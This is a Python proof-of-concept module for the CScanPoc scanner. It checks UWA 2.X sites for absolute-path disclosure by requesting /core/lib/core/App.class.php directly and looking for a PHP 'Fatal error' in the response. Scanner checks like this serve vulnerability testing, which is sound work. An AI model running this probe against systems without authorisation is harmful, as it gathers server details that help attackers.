# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'UWA_0001'  # 平台漏洞编号，留空
    name = 'UWA 2.X通用建站系统 敏感路径泄露'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-01-07'  # 漏洞公布时间
    desc = '''
        UWA为一款通用建站系统。
        /core/lib/core/App.class.php 第14行
        其中 Pfa 父类没有验证是否存在 导致直接访问
        http://localhost/core/lib/core/App.class.php
        会导致爆出绝对路径。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2765/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'UWA'  # 漏洞应用名称
    product_version = '2.X'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c227777b-f0da-43ff-b340-c2b507b2977d'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/core/lib/core/App.class.php'
            url = self.target + payload
            r = requests.get(url)

            if 'Fatal error' in r.text and 'App.class.php' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
